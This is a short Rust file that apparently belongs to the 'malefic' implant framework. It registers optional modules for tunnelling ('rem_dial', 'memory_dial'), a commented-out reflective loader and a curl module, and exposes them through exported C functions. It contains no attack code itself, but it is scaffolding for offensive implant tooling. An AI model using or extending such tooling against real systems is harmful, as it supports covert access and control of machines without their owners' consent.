use malefic_modules::{register_module, MaleficBundle, Module};
use std::collections::HashMap;

#[cfg(feature = "rem")]
mod rem;

#[cfg(feature = "curl")]
mod curl;

pub extern "C" fn register_3rd() -> MaleficBundle {
    let mut map: MaleficBundle = HashMap::new();
    #[cfg(feature = "rem")]
    {
        register_module!(map, "rem_dial", rem::RemDial);
        register_module!(map, "memory_dial", rem::MemoryDial);
    }

    // #[cfg(feature = "rem_reflection")]
    // register_module!(map, "load_rem", rem::LoadRem);

    #[cfg(feature = "curl")]
    register_module!(map, "curl", curl::Curl);
    map
}

#[cfg(feature = "as_cdylib")]
#[no_mangle]
#[allow(improper_ctypes_definitions)]
pub extern "C" fn register_modules() -> MaleficBundle {
    register_3rd()
}
